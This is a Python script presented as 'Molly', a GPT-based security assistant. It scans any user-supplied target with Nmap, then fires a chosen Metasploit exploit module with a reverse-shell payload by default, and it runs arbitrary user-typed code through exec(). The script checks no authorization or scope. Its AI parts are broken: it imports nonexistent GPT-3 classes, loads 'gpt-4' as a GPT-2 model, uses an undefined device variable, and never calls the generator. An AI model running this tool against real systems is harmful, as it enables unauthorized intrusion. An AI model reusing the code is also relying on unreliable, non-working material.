import json
import os
import nmap
import subprocess
from scapy.all import *
from msfrpc import MsfRpcClient
from transformers import GPT2LMHeadModel, GPT2Tokenizer, GPTNeoForCausalLM, GPT3Tokenizer, GPT3Model
import torch
import datetime

# Initialize Metasploit client
client = MsfRpcClient('your_password', server='127.0.0.1', ssl=False)

# Function to initialize model and tokenizer
def initialize_model_and_tokenizer(model_choice):
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    if model_choice == "gpt-4":
        model_name = "gpt-4"  # Ensure GPT-4 model is available
        model = GPT2LMHeadModel.from_pretrained(model_name).to(device)
        tokenizer = GPT2Tokenizer.from_pretrained(model_name)
    elif model_choice == "gpt-3.5":
        model_name = "EleutherAI/gpt-neo-2.7B"
        model = GPTNeoForCausalLM.from_pretrained(model_name).to(device)
        tokenizer = GPT3Tokenizer.from_pretrained(model_name)
    return model, tokenizer

# Function to choose model
def choose_model():
    print("Choose the model you want to use:")
    print("1. GPT-4")
    print("2. GPT-3.5")
    choice = input("Enter the number of your choice: ")
    if choice == '1':
        return initialize_model_and_tokenizer("gpt-4")
    elif choice == '2':
        return initialize_model_and_tokenizer("gpt-3.5")
    else:
        print("Invalid choice. Defaulting to GPT-4.")
        return initialize_model_and_tokenizer("gpt-4")

# Initialize model and tokenizer
model, tokenizer = choose_model()

# Welcome message and introduction
def welcome_message():
    print("Hello, I'm Molly, your GPT-based security assistant.")
    print("Which network target, device, server, or machine are we testing on this run?")

# Function to generate a response using GPT
def generate_response(prompt):
    inputs = tokenizer.encode(prompt, return_tensors="pt").to(device)
    outputs = model.generate(inputs, max_length=150, num_return_sequences=1, no_repeat_ngram_size=2, early_stopping=True)
    response = tokenizer.decode(outputs[0], skip_special_tokens=True)
    return response

# Function to run Nmap scan
def run_nmap_scan(target):
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-A')
    return nm

# Function to run Metasploit module and collect data
def run_module(module_name, target_ip, payload='generic/shell_reverse_tcp'):
    module = client.modules.use('exploit', module_name)
    module['RHOSTS'] = target_ip
    module['PAYLOAD'] = payload
    module.execute(payload=payload)
    
    # Collecting job details
    jobs = client.jobs.list
    job_id = list(jobs.keys())[0] if jobs else None

    if job_id:
        job_info = client.jobs.info(job_id)
        return {
            'module': module_name,
            'target': target_ip,
            'payload': payload,
            'job_info': job_info
        }
    return None

# Main function
def main():
    welcome_message()
    
    target = input("Enter the target (IP address, MAC address, URL, etc.): ")
    
    print("\nScanning the target using Nmap...")
    nmap_scan = run_nmap_scan(target)
    
    print("\nNmap scan results:")
    print(nmap_scan.csv())
    
    save_scan = input("Do you want to save the scan data? (y/n): ").lower()
    if save_scan == 'y':
        if not os.path.exists('scan_output'):
            os.makedirs('scan_output')
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        with open(f'scan_output/nmap_scan_{timestamp}.txt', 'w') as f:
            f.write(nmap_scan.csv())
        print("Scan data saved.")
    
    test_vulnerabilities = input("Do you want to test found vulnerabilities? (y/n): ").lower()
    if test_vulnerabilities == 'y':
        print("\nListing found vulnerabilities and available exploits...")
        # Example of extracting CVE or exploits from Nmap results
        for host in nmap_scan.all_hosts():
            if 'hostscript' in nmap_scan[host]:
                for script in nmap_scan[host]['hostscript']:
                    if 'cve' in script['id']:
                        print(f"Found vulnerability: {script['output']}")
        
        exploit_choice = input("Enter the exploit module you want to run: ")
        payload_choice = input("Enter the payload to use (or leave blank for default): ") or 'generic/shell_reverse_tcp'
        
        print("\nRunning the chosen Metasploit module...")
        result = run_module(exploit_choice, target, payload_choice)
        print(json.dumps(result, indent=4))
    
    custom_script = input("Do you want to enter a custom script to run? (y/n): ").lower()
    if custom_script == 'y':
        script_content = input("Enter your custom script:\n")
        exec(script_content)
    
    print("Operation completed.")

if __name__ == "__main__":
    main()
